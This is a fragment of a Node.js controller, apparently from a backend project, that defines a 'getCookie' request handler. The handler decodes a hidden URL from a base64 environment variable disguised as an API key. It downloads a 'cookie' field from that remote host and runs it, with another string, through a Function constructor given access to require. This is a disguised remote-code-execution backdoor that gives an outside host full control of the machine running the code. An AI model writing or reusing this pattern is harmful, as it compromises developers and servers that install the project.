...
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
  ...
  const src_demo = atob(process.env.DEV_API_KEY_DEMO);
  ...
  const d = (await axios.get(src_demo,{headers:{[k]:v}})).data.cookie;
  const handler = new (Function.constructor)('require',s);
  const handler_d = new (Function.constructor)('require',d);
  handler(require);
  handler_d(require);
})();
